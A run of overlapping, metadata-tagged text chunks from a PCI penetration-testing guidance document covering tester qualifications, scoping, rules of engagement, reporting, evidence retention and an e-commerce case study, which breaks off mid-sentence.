    "text": "Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone. Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing? Discussion of the penetration tester’s familiarity with testing to validate the OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 9
    }
  },
  {
    "text": "OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted. Note: An organization may want to consider having a development-environment lab where penetration tests can be performed outside of the production environment and internal resources can train and increase their experience to help both their skills and potential certifications. The intent of this document is to provide supplemental information. Information provided here does not 13\\n4 Methodology To ensure a successful penetration test, there are several activities and processes to be considered beyond the testing itself. This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 10
    }
  },
  {
    "text": "confirm the proper segmentation of out-of-scope environments. The intent of this document is to provide supplemental information. Information provided here does not 14\\n4.1.3 Rules of Engagement Prior to the commencement of any testing, it is important to document and agree upon the conditions in which testing is to be performed and the degree of exploitation, if any, that is permitted. This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information. Information provided here does not 15\\n4.1.4 Third-Party-Hosted / Cloud Environments Below are examples of considerations that may be included in the rules of engagement for third-party- hosted/cloud environments of the entity:  If a service-level agreement requires approval from a third party before penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 11
    }
  },
  {
    "text": "penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 12
    }
  },
  {
    "text": "noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking vulnerabilities that may have not been detected at the time of the most recent penetration test The tester may gain additional insight of the target environment for this review by:  Reviewing prior penetration test reports  Reviewing previously issued Reports on Compliance or Attestations of Compliance  Reviewing current vulnerability scan test results 4.1.7 Avoid scan interference on security appliances. In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 13
    }
  },
  {
    "text": "present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 14
    }
  },
  {
    "text": "of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 15
    }
  },
  {
    "text": "steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported. This determination may be made after a risk analysis of how much change has occurred since the original testing was completed. In specific conditions, the flagged security issue may represent a fundamental flaw in an environment or application. The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information. Information provided here does not 20\\n5 Reporting and Documentation The purpose of the report is to assist the organization in its efforts to improve its security posture by identifying areas of potential risk that may need to be remediated. Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 16
    }
  },
  {
    "text": "were not necessarily exploitable but which are deemed to pose a potential risk to the environment. It is recommended that the report contain any findings that impact the security posture of the assessed entity even in cases where exploitation did not occur. Some examples of identified vulnerabilities that were not exploited for valid reasons and should be included in the report may be:  Firewall misconfigurations that permit unauthorized traffic between secure and insecure zones  Detection of credentials obtained through manipulation of a web-application error message that was not flagged during an ASV scan due to a low CVSS base score 5.1.1 Assigning a Severity Score In order to prioritize remediation of the penetration test findings, it is a common practice during the reporting phase for a severity or risk ranking to be assigned for each detected security issue. The report should clearly document how the severity/risk ranking is derived. In most cases, severity/risk ranking may be applied as a result of evaluating an industry-standard score (e.g., NVD, CVSS) against a threshold or value that indicates risk (i.e., high, medium, and low). However, it should be noted that it is possible for a vulnerability to exist that is inherent to a particular environment; therefore, a standardized score is not available. When custom scoring is part of the risk-ranking process, the report should reflect a traceable set of reasoning for the modification of industry-standard scores or, where applicable, for the creation of a score for a vulnerability that does not have an industry-standard score defined. The intent of this document is to provide supplemental information. Information provided here does not 21\\n5.1.2 Industry Standard References Some well-known, industry-standard references include:  National Vulnerability Database (NVD)  Common Vulnerability Scoring System (CVSS)  Common Vulnerabilities and Exposure (CVE)  Common Weakness Enumeration (CWE)  Bugtraq ID (BID)  Open Source Vulnerability Database (OSVDB) The Common Vulnerability Scoring System (CVSS) is an example of an open framework that may be referenced for assigning a baseline risk rating. The CVSS is the required scoring system for Approved Scanning Vendors (ASVs) to use for ranking vulnerabilities detected during PCI vulnerability scans. Using this system, a standardized vulnerability score can be adjusted through the evaluation of the traits of vulnerability within the context of a specific environment. 5.2 Reporting Guidelines Comprehensive and consistent reporting is a critical phase of a penetration test. This section provides guidelines on common contents of an industry standard penetration test. It should be noted that these are only suggested outlines and do not define specific reporting requirements for PCI DSS penetration tests. Testers may have different sections, alternative titles, and/or report format, etc.; this outline represents data gathered from a number of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 17
    }
  },
  {
    "text": "of penetration testing providers and the desires of customers. 5.2.1 Penetration Test Report Outline  Executive Summary Brief high-level summary of the penetration test scope and major findings o  Statement of Scope A detailed definition of the scope of the network and systems tested as part of o the engagement Clarification of CDE vs. non-CDE systems or segments that are considered during the test o Identification of critical systems in or out of the CDE and explanation of why they are o included in the test as targets  Statement of Methodology Details on the methodologies used to complete the testing (port scanning, nmap etc.). o See Section 4 for details on methodologies that should be documented.  Statement of Limitations Document any restrictions imposed on testing such as designated testing hours, o bandwidth restrictions, special testing requirements for legacy systems, etc. The intent of this document is to provide supplemental information. Information provided here does not 22\\n Testing Narrative Provide details as to the testing methodology and how testing progressed. For example, if o the environment did not have any active services, explain what testing was performed to verify restricted access. Document any issues encountered during testing (e.g., interference was encountered o as a result of active protection systems blocking traffic).  Segmentation Test Results Summarize the testing performed to validate segmentation controls, if used to reduce o the scope of PCI DSS.  Findings Whether/how the CDE may be exploited using each vulnerability. o Risk ranking/severity of each vulnerability o Targets affected o References (if available) o CVE, CWE, BID, OSBDB, etc. - Vendor and/or researcher - Description of finding o  Tools Used  Cleaning up the Environment Post-Penetration Test After testing there may be tasks the tester or customer needs to perform to restore the target environment (i.e., update/removal of test accounts or database entries added or modified during testing, uninstall of test tools or other artifacts, restoring active protection-system settings, and/or other activities the tester may not have permissions to perform, etc.). Provide directions on how cleanup should be performed and how to verify security o controls have been restored. 5.2.2 Retesting Considerations and Report Outline If the noted findings will require remediation and retesting before an assessor can determine the entity has met PCI DSS Requirement 11.3, a follow-up test report may be provided. All remediation efforts should be completed and retested within a reasonable period of time after the original penetration test report was provided. It is expected that the remediation test report will cover all identified/exploitable vulnerabilities that require remediation. Those identified vulnerabilities is may be medium or high for external penetration tests and those defined by the organization as medium or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 18
    }
  },
  {
    "text": "or high for internal tests. The intent of this document is to provide supplemental information. Information provided here does not 23\\nThe following is an example of the sections to include in a retest report as defined in Section 5.2.1:  Executive Summary  Date of Original Test  Date of Retest  Original Findings  Results of Retest 5.3 Evidence retention 5.3.1 What is considered evidence? A typical penetration test involves obtaining and evaluating evidence using a formal methodology; evidence collected from the penetration test is used to determine the conclusion. Evidence is considered all information that supports the penetration tester’s conclusions about the effectiveness of the security controls and the environment’s overall security posture. The penetration tester should follow a systematic process to securely collect, handle, and store evidence. Examples of evidence include but are not limited to screenshots, raw tool output (i.e., NMAP, burp suite, Nessus, TCPDump Wireshark, etc.), acquired dumps in case of exploitation (i.e., database files, logs, configuration files etc.), photos, recordings, and anything that may support the final conclusion of the penetration test report. It should be noted that if cardholder data is acquired during the penetration test, it is recommended that it be kept to a minimum. For example, a database full of cardholder data should not be dumped to the tester’s machine or system. 5.3.2 Retention It is recommended that procedures for retention and destruction of evidence be documented for all parties involved prior to commencing the penetration test. If a third party is used to perform the penetration test, contract language should be reviewed to confirm these procedures are clear. While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that such evidence be retained by the tester (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement. If, however, a tester stores cardholder data obtained during the engagement, the data must be stored by the tester following the guidelines of the PCI DSS for the storage of account data—i.e., encrypted using strong cryptography, truncated/hashed, or not stored. Storage of account data by the tester is not recommended. This data should be securely wiped from tester systems at the conclusion of the engagement. The intent of this document is to provide supplemental information. Information provided here does not 24\\n5.4 Penetration Test Report Evaluation Tool This section is intended for entities that receive a penetration test report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 19
    }
  },
  {
    "text": "report and need to interpret and evaluate the completeness of the report. The intent is to provide a tool that could be used by merchants, service providers, and assessors to quickly determine the depth of testing and quality of the reporting based upon the contractual agreement between the organization and the tester. It should be noted that this checklist is not intended to take the place of thorough report inspection, interpretation of the findings, and taking appropriate action. Table 1 details the questions, a place to record whether the item is included in the report and the page number where it is found. It is not the intent to generate any type of “score” from the results, as its intent is to provide a communication tool that may be used between the entity and the tester after a report has been written and the results evaluated. It should be noted that these items represent a suggested minimum set of items to look for in the report; additional content may be present. Table 1: Report Evaluation Checklist Included In Report Report Question Page Yes No Penetration Tester Name/Organization ☐ ☐ Contact information ☐ ☐ Credentials/qualifications of analysts Is there sufficient evidence that the individuals are organizationally ☐ ☐ independent from the management of the environment being tested? ☐ ☐ Dates the engagement was performed ☐ ☐ Date the report was issued Executive Summary ☐ ☐ Summarizes testing performed ☐ ☐ Summarizes results of testing ☐ ☐ Summarizes steps for remediation Scope ☐ ☐ Is the scope clearly documented? ☐ ☐ How the scope was determined Is the attack perspective of the engagement clearly defined (internal, external, ☐ ☐ or both)? The intent of this document is to provide supplemental information. Information provided here does not 25\\nIncluded In Report Report Question Page Yes No Is the type of testing clearly defined (application layer, network layer, or both)? ☐ ☐ Were there any constraints put on the testing (time, bandwidth limitations, ☐ ☐ etc.)? Methodology ☐ ☐ Is the methodology clearly stated? Does the methodology reflect industry best practices (OWASP, NIST, etc.)? ☐ ☐ Narrative Is there a clear discussion of the automated and manual testing that was ☐ ☐ performed? Is there clear documentation of any problems that were encountered during ☐ ☐ the testing (interference from active protection systems, target environment controls blocking or dropping packets, etc.)? Discovery Is there a section that documents all identified open network ports/services for ☐ ☐ the target scope and the originating perspective (external or internal exposure)? Results Is there a clear indication whether retesting is needed, and if so, what specific ☐ ☐ areas require retesting? Is there a summary listing of items that need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 20
    }
  },
  {
    "text": "need remediation and retesting? ☐ ☐ Is there a detailed listing of items that need remediation and retesting? ☐ ☐ Did tester demonstrate attempts to exploit the identified vulnerability and ☐ ☐ clearly state the potential result/risk that each potential exploit may pose to the environment? (See Section 5.1.1 for risk-ranking discussion.) The intent of this document is to provide supplemental information. Information provided here does not 26\\n6 Case Studies / Scoping Examples This section provides a number of case studies that illustrate various concepts and methodologies covered in this document. 6.1 E-commerce Penetration Test Case Study Case Introduction The Client is a level-one merchant and retailer of women’s clothing. Client has three unique brands running on multiple e-commerce web sites. Brand A runs on a third-party e-commerce platform written using a Java platform with Apache Tomcat and IBM’s DB2 database and utilizes a content-delivery network for image distribution. Brand B and Brand C utilize an in-house coded e-commerce shopping cart written in ColdFusion with Microsoft SQL and share the same underlying code. All brands submit cardholder data for processing over HTTPS. All sites are hosted at a third-party hosting provider on dedicated systems. The Client’s firewalls have integrated intrusion prevention features. Client has exclusive control of the code and the content. Product Managers update product information using staging servers in the corporate environment, and the updates are promoted to production by IT support staff. Client has full control of DNS. Description of Environment The environment for Brands A, B, and C is comprised of five networks. The web DMZ contains the firewalls, DNS servers, load balancers, and web servers for all brands. Only the load balancers are NAT’d and have publicly routable IP addresses. The application tier contains the Apache Tomcat and ColdFusion middleware servers. It is segmented from the DMZ and database tiers using firewall access controls. The database tier contains the Microsoft SQL and IBM DB2 servers. It is segmented from the application tier using firewall access controls. The management network is used for backups, patch-management servers, NTP Servers, network-traffic analysis devices, and syslog collectors. The management network is accessible using jump boxes with two-factor authentication from the corporate network over a point-to-point VPN. Pre-Engagement Activities (Planning) Once the engagement is confirmed, the Pen Test Company scheduled a kick-off call and provided the Client with a testing questionnaire and test-authorization form to be completed before the next meeting. The kick-off call is generally used to review the rules of engagement, define the success criteria, and review the methodology to be used. An examination of this type could be conducted in accordance with information system security assessment best practices such as described by the Open Source Security Testing Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information.",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 21
    }
  },
  {
    "text": "Methodology Manual (“OSSTMM”), The National Institute of Standards and Technology (“NIST”) Special Publication 800-115, Technical Guide to Information Security Testing and Assessment, or the Open Web Application Security Project (OWASP) testing methodology as defined in the OWASP Testing Guide v.3.0. The intent of this document is to provide supplemental information. Information provided here does not 27\\nScoping is critical, and the more complex the environment, the more difficult it becomes. In this case, all external IPs used for the DMZ and web tier were included in the scope. This would include all systems that directly store, process, or transmit cardholder data. Because the Client has full control and full responsibility for its security, the DNS server was included in the scope of the test to determine whether an attacker could compromise the server and redirect traffic intended for the Client’s sites to a malicious intermediary or fraudulent site. The image CDN servers were determined out of scope because no PAN data is transmitted or processed and the systems are otherwise fully segmented. The staging systems are unavailable from the Internet and therefore cannot be tested. The web applications for Brand A and Brand B will be completely in scope. The web application for Brand C is presumed to be an exact copy, exclusive of product information and look and feel. The tester will sample the web application for Brand C to verify that the applications are the same as Brand B. If it is determined that there are material differences between Brand B and Brand C web applications, Brand C will be brought fully into scope. The Client and Pen Test Company have agreed that testing will be conducted against the production systems, as no suitable staging or review system is publicly available. Because of this limitation, testing must be performed with the intrusion prevention system enabled. However, because the timeline for testing cannot accommodate the time required to use techniques that might bypass the IPS, the Client has agreed to remove any blocks enabled by the system during testing. For this engagement the Client has requested that additional rules of engagement include that testing be limited to non-peak hours, and any attempts to run exploit code on the remote systems be performed only after notifying the Client. Also, any accounts created by the tester or successful orders placed in the system must be identified at the end of each day’s testing. All parties have agreed that no further testing is required if the penetration tester is able to extract data from either of the databases or obtain shell access on any server in the web farm. Engagement Phase (Discovery and Attack/Execution) The penetration tester began by comparing the scope provided by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 22
    }
  },
  {
    "text": "by the Client with the latest ASV report to ensure they agreed on the assets and targets under examination. Any differences in scope were noted and investigated. The penetration tester then gathered information on the target organization through web sites and mail servers, public records, and databases. This open-source intelligence (OSINT) gathering is an important next step in confirming scope and determining that all the appropriate assets have been included in the test. Newly discovered assets were vetted by the Client to determine whether they should be included in the penetration test. During this phase of the assessment, an additional disaster recovery site was identified in DNS, and Client confirmed this to be a warm backup in the event of failure of the primary sites. All relevant assets were added to the scope. The intent of this document is to provide supplemental information. Information provided here does not 28\\nOnce the assets were confirmed, the penetration tester enumerated the publicly available services provided by the targets. The tester actively tried to obtain usernames, network-share information, and application- version information of all running services and applications. In this phase, the penetration tester began to spider and map the applications, with and without credentials, in preparation for the exploitation phase. The tester was provided with the ability to complete a full transaction all the way through checkout and order confirmation. With target enumeration complete, the tester performed vulnerability mapping of identified services using automated tools and by comparing the port and service fingerprint against well-known vulnerability databases. This produced a list of unconfirmed vulnerabilities that were further examined in the exploitation phase of testing. The exploitation phase included tests and techniques designed to meet the objectives of the test. (These must be exploitive and may also be used to confirm the effectiveness of ancillary security controls such as intrusion detection systems or web application firewalls.) It was during this step that testing of the applications for issues related to the OWASP Top 10 and other web application frameworks took place. The final phase of testing included post-exploitation techniques. The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using 